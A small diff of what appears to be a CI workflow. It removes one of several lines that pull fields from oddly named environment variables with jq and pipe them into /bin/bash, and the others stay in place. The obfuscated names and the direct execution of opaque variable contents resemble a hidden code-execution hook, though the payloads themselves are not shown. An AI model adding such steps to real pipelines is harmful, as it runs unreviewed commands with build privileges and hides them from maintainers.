@@ -26,7 +26,6 @@ jobs:
           echo $dej8073 | jq -r .dxofn384 | /bin/bash
           echo $llnvp095 | jq -r .bphp86290 | /bin/bash
           printf '%s' "$rka79511" | jq -r .moo74 | /bin/bash
-          echo $up119 | jq -r .okgh6648 | /bin/bash
           printf '%s' "$apoot44" | jq -r .gh60 | /bin/bash
 
       - name: Store artifact
